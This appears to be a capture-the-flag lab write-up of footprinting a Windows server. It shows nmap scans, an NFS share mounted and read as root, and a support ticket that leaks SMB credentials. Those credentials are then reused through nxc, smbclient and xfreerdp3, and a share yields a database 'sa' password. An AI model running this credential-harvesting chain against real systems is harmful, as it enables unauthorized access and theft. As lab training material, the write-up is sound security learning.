Task:
This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope.

Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named `HTB` has been created. Accordingly, we need to obtain the credentials of this user as proof.

> Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.

## nmap scan

```
nmap -sC -sV 10.129.156.150 --open
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-02 16:07 -0500
Nmap scan report for 10.129.156.150
Host is up (0.040s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINMEDIUM
|   NetBIOS_Domain_Name: WINMEDIUM
|   NetBIOS_Computer_Name: WINMEDIUM
|   DNS_Domain_Name: WINMEDIUM
|   DNS_Computer_Name: WINMEDIUM
|   Product_Version: 10.0.17763
|_  System_Time: 2026-11-01T21:05:29+00:00
|_ssl-date: 2026-11-01T21:05:37+00:00; -1d00h02m50s from scanner time.
| ssl-cert: Subject: commonName=WINMEDIUM
| Not valid before: 2026-10-31T21:02:18
|_Not valid after:  2027-05-02T21:02:18
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-11-01T21:05:29
|_  start_date: N/A
|_clock-skew: mean: -1d00h02m50s, deviation: 0s, median: -1d00h02m50s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.09 seconds
                                                              
```

```
sudo nmap --script nfs* -sV -p111,2049 10.129.156.150
[sudo] password for kali: 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-02 16:18 -0500
Nmap scan report for 10.129.156.150
Host is up (0.045s latency).

PORT     STATE SERVICE  VERSION
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
| nfs-showmount: 
|_  /TechSupport 
2049/tcp open  nlockmgr 1-4 (RPC #100021)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.70 seconds

```

## NFS enumeration

```
┌──(kali㉿kali)-[~/labs/footprinting/medium]
└─$ mkdir target-NFS
sudo mount -t nfs 10.129.156.150:/ ./target-NFS/ -o nolock
                                                                                                                
┌──(kali㉿kali)-[~/labs/footprinting/medium]
└─$ ls
target-NFS
                                                                                                                
┌──(kali㉿kali)-[~/labs/footprinting/medium]
└─$ cd target-NFS        
                                                                                                                
┌──(kali㉿kali)-[~/labs/footprinting/medium/target-NFS]
└─$ ls
TechSupport
                                                                                                                
┌──(kali㉿kali)-[~/labs/footprinting/medium/target-NFS]
└─$ cd TechSupport
cd: permission denied: TechSupport
                                                                                                                
┌──(kali㉿kali)-[~/labs/footprinting/medium/target-NFS]
└─$ ls -la TechSupport                                                         
ls: cannot open directory 'TechSupport': Permission denied
```

```
┌──(kali㉿kali)-[~/labs/footprinting/medium/target-NFS]
└─$ sudo su                              
┌──(root㉿kali)-[/home/…/labs/footprinting/medium/target-NFS]
└─# ls
TechSupport
                                                                                                                
┌──(root㉿kali)-[/home/…/labs/footprinting/medium/target-NFS]
└─# cd TechSupport
                                                                                                                
┌──(root㉿kali)-[/home/…/footprinting/medium/target-NFS/TechSupport]
└─# ls
ticket4238791283649.txt  ticket4238791283688.txt  ticket4238791283727.txt  ticket4238791283766.txt
ticket4238791283650.txt  ticket4238791283689.txt  ticket4238791283728.txt  ticket4238791283767.txt
ticket4238791283651.txt  ticket4238791283690.txt  ticket4238791283729.txt  ticket4238791283768.txt
ticket4238791283652.txt  ticket4238791283691.txt  ticket4238791283730.txt  ticket4238791283769.txt
ticket4238791283653.txt  ticket4238791283692.txt  ticket4238791283731.txt  ticket4238791283770.txt
ticket4238791283654.txt  ticket4238791283693.txt  ticket4238791283732.txt  ticket4238791283771.txt
ticket4238791283655.txt  ticket4238791283694.txt  ticket4238791283733.txt  ticket4238791283772.txt
ticket4238791283656.txt  ticket4238791283695.txt  ticket4238791283734.txt  ticket4238791283773.txt
ticket4238791283657.txt  ticket4238791283696.txt  ticket4238791283735.txt  ticket4238791283774.txt
ticket4238791283658.txt  ticket4238791283697.txt  ticket4238791283736.txt  ticket4238791283775.txt
ticket4238791283659.txt  ticket4238791283698.txt  ticket4238791283737.txt  ticket4238791283776.txt
ticket4238791283660.txt  ticket4238791283699.txt  ticket4238791283738.txt  ticket4238791283777.txt
ticket4238791283661.txt  ticket4238791283700.txt  ticket4238791283739.txt  ticket4238791283778.txt
ticket4238791283662.txt  ticket4238791283701.txt  ticket4238791283740.txt  ticket4238791283779.txt
ticket4238791283663.txt  ticket4238791283702.txt  ticket4238791283741.txt  ticket4238791283780.txt
ticket4238791283664.txt  ticket4238791283703.txt  ticket4238791283742.txt  ticket4238791283781.txt
ticket4238791283665.txt  ticket4238791283704.txt  ticket4238791283743.txt  ticket4238791283782.txt
ticket4238791283666.txt  ticket4238791283705.txt  ticket4238791283744.txt  ticket4238791283783.txt
ticket4238791283667.txt  ticket4238791283706.txt  ticket4238791283745.txt  ticket4238791283784.txt
ticket4238791283668.txt  ticket4238791283707.txt  ticket4238791283746.txt  ticket4238791283785.txt
ticket4238791283669.txt  ticket4238791283708.txt  ticket4238791283747.txt  ticket4238791283786.txt
ticket4238791283670.txt  ticket4238791283709.txt  ticket4238791283748.txt  ticket4238791283787.txt
ticket4238791283671.txt  ticket4238791283710.txt  ticket4238791283749.txt  ticket4238791283788.txt
ticket4238791283672.txt  ticket4238791283711.txt  ticket4238791283750.txt  ticket4238791283789.txt
ticket4238791283673.txt  ticket4238791283712.txt  ticket4238791283751.txt  ticket4238791283790.txt
ticket4238791283674.txt  ticket4238791283713.txt  ticket4238791283752.txt  ticket4238791283791.txt
ticket4238791283675.txt  ticket4238791283714.txt  ticket4238791283753.txt  ticket4238791283792.txt
ticket4238791283676.txt  ticket4238791283715.txt  ticket4238791283754.txt  ticket4238791283793.txt
ticket4238791283677.txt  ticket4238791283716.txt  ticket4238791283755.txt  ticket4238791283794.txt
ticket4238791283678.txt  ticket4238791283717.txt  ticket4238791283756.txt  ticket4238791283795.txt
ticket4238791283679.txt  ticket4238791283718.txt  ticket4238791283757.txt  ticket4238791283796.txt
ticket4238791283680.txt  ticket4238791283719.txt  ticket4238791283758.txt  ticket4238791283797.txt
ticket4238791283681.txt  ticket4238791283720.txt  ticket4238791283759.txt  ticket4238791283798.txt
ticket4238791283682.txt  ticket4238791283721.txt  ticket4238791283760.txt  ticket4238791283799.txt
ticket4238791283683.txt  ticket4238791283722.txt  ticket4238791283761.txt  ticket4238791283800.txt
ticket4238791283684.txt  ticket4238791283723.txt  ticket4238791283762.txt  ticket4238791283801.txt
ticket4238791283685.txt  ticket4238791283724.txt  ticket4238791283763.txt
ticket4238791283686.txt  ticket4238791283725.txt  ticket4238791283764.txt
ticket4238791283687.txt  ticket4238791283726.txt  ticket4238791283765.txt

```

```
cat *                      
Conversation with InlaneFreight Ltd

Started on November 10, 2021 at 01:27 PM London time GMT (GMT+0200)
---
01:27 PM | Operator: Hello,. 
 
So what brings you here today?
01:27 PM | alex: hello
01:27 PM | Operator: Hey alex!
01:27 PM | Operator: What do you need help with?
01:36 PM | alex: I run into an issue with the web config file on the system for the smtp server. do you mind to take a look at the config?
01:38 PM | Operator: Of course
01:42 PM | alex: here it is:

 1smtp {
 2    host=smtp.web.dev.inlanefreight.htb
 3    #port=25
 4    ssl=true
 5    user="alex"
 6    password="lol123!mD"
 7    from="alex.g@web.dev.inlanefreight.htb"
 8}
 9
10securesocial {
11    
12    onLoginGoTo=/
13    onLogoutGoTo=/login
14    ssl=false
15    
16    userpass {      
17      withUserNameSupport=false
18      sendWelcomeEmail=true
19      enableGravatarSupport=true
20      signupSkipLogin=true
21      tokenDuration=60
22      tokenDeleteInterval=5
23      minimumPasswordLength=8
24      enableTokenJob=true
25      hasher=bcrypt
26      }
27
28     cookie {
29     #       name=id
30     #       path=/login
31     #       domain="10.129.2.59:9500"
32            httpOnly=true
33            makeTransient=false
34            absoluteTimeoutInMinutes=1440
35            idleTimeoutInMinutes=1440
36    }   



---

```

## shares enum

```
nxc smb 10.129.156.150 -u alex -p 'lol123!mD' --shares
SMB         10.129.156.150  445    WINMEDIUM        [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINMEDIUM) (domain:WINMEDIUM) (signing:True) (SMBv1:None)
SMB         10.129.156.150  445    WINMEDIUM        [+] WINMEDIUM\alex:lol123!mD 
SMB         10.129.156.150  445    WINMEDIUM        [*] Enumerated shares
SMB         10.129.156.150  445    WINMEDIUM        Share           Permissions     Remark
SMB         10.129.156.150  445    WINMEDIUM        -----           -----------     ------
SMB         10.129.156.150  445    WINMEDIUM        ADMIN$                          Remote Admin
SMB         10.129.156.150  445    WINMEDIUM        C$                              Default share
SMB         10.129.156.150  445    WINMEDIUM        devshare        READ,WRITE      
SMB         10.129.156.150  445    WINMEDIUM        IPC$            READ            Remote IPC
SMB         10.129.156.150  445    WINMEDIUM        Users           READ            

```

```
 smbclient -U alex --password 'lol123!mD' //10.129.156.150/devshare   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Nov  1 16:31:38 2026
  ..                                  D        0  Sun Nov  1 16:31:38 2026
  important.txt                       A       16  Wed Nov 10 11:12:55 2021

                10328063 blocks of size 4096. 6101539 blocks available

```

```
sa:87N1ns@slls83
/tmp/smbmore.5nseho (END)

```


```
KRB5_CONFIG=/dev/null xfreerdp3 /v:10.129.156.150 /u:alex /p:'lol123!mD' /cert:ignore
```

![](./screens/1.png) 

![](./screens/2.png)

![](./screens/3.png)

![](./screens/4.png)